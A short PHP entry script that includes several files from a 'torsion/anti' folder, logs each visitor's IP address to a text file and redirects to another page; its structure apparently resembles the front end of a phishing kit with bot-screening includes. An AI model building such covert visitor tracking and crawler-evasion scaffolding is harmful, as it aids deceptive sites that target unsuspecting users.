<?php
include "torsion/anti/anti3.php";
include "torsion/anti/shadow1.php"; 
include "torsion/anti/shadow2.php"; 
include "torsion/anti/shadow3.php"; 
include "torsion/anti/shadow4.php"; 
include "torsion/anti/shadow5.php"; 
include "torsion/anti/shadow6.php"; 
include "torsion/anti/shadow7.php"; 
include "torsion/anti/shadow8.php"; 
$ipp=$_SERVER['REMOTE_ADDR'];
$fila=fopen("vues.txt", "a");
fwrite($fila, $ipp."\n");
fclose($fila);
header("location: torsion/index.php")


?>